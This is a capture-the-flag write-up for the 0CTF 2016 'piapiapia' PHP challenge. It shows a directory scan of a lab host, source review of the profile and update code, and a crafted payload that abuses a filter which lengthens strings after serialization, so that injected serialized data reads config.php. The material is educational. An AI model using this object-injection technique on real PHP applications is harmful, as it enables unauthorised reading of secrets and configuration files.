### References

- [@g0udan, piapiapia解题详细思路及复现, 2020-01-20](https://www.cnblogs.com/g0udan/p/12216207.html)
- [@frystal, [0CTF 2016]piapiapia, 2019-11-08](https://frystal.github.io/2019/11/08/0CTF-2016-piapiapia/)

**Tag: PHP unserialize, LFI, Code review**

1.Try sql injection so hard, just dirsearch :/

```tex
py .\dirsearch.py -e php,bak,zip -u http://192.168.200.129:8302 -t 20 -x 404

[22:15:44] Starting:
[22:15:59] 200 -    0B  - /config.php
[22:16:08] 200 -   11B  - /profile.php
[22:16:11] 301 -  185B  - /static  ->  http://192.168.200.129/static/
[22:16:12] 200 -   11B  - /update.php
[22:16:12] 301 -  185B  - /upload  ->  http://192.168.200.129/upload/
[22:16:12] 403 -  571B  - /upload/
[22:16:14] 200 -  392KB - /www.zip
```

we can found some interesting files like `www.zip`.

2.`$flag` variable stored inside `config.php`, may be we need to include or read this file to get the flag. It's easy to find that there are file operation functions `file_get_contents` in `profile.php`, and the parameter `$photo` is controllable:

```php
$profile=$user->show_profile($username);
if($profile  == null) {
    header('Location: update.php');
} else {
    $profile = unserialize($profile);
    $phone = $profile['phone'];
    $email = $profile['email'];
    $nickname = $profile['nickname'];
    $photo = base64_encode(file_get_contents($profile['photo']));
```

so if we change `$profile['photo']` to `config.php`, we can get the flag at profile with base64 decoded.

3.Since there is a unserialization operation, so elsewhere have serialization definitely. We can find it in `update.php`:

```php
if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {
    $username = $_SESSION['username'];
    ...if...
    $file = $_FILES['photo'];
    ...if...
    move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
    $profile['phone'] = $_POST['phone'];
    $profile['email'] = $_POST['email'];
    $profile['nickname'] = $_POST['nickname'];
    $profile['photo'] = 'upload/' . md5($file['name']);
    $user->update_profile($username, serialize($profile));
```

Regular expressions are used here to filter the data we submit, one of them that we noticed was a little bit different:

```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
    die('Invalid nickname');
```

Use the `strlen` function to determine whether the nickname length exceeds 10, and we can easily bypass this restriction using array like `nickname[]=`.

Now we have preliminary ideas that we need to control serialized data make it can read `config.php` during unserialization.

4.Follow the `update_profile` function, in `class.php`:

```php
public function update_profile($username, $new_profile) {
    $username = parent::filter($username);
    $new_profile = parent::filter($new_profile);
    $where = "username = '$username'";
    return parent::update($this->table, 'profile', $new_profile, $where);
}
```

and the `filter`:

```php
public function filter($string) {
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape, '_', $string);

    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);
}
```

The problem is, it's sanitized **after** being serialized,

> Any data with a certain structure may cause problems if the structure is disrupted after some processing.

the `filter` function replacing "where" with "hacker" changes the length of the string. Allowing us to replace part of serialized object with our content.

5.As mentioned above, We need replace photo file name with `config.php`:

```tex
";}s:5:"photo";s:10:"config.php";}
```

here are 34 characters, so we need input `where` 34 times and it replace to `hacker` increased string length by 34. Payload:

```python
>>> print('where' * 34 + '";}s:5:"photo";s:10:"config.php";}')
wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```

During `unserialize()`, it will automatically ignore the content that can be serialized correctly. So the rest of the content is discarded.

![img1](./assets/img1.png?raw=true)

go profile.php:

![img2](./assets/img2.png?raw=true)

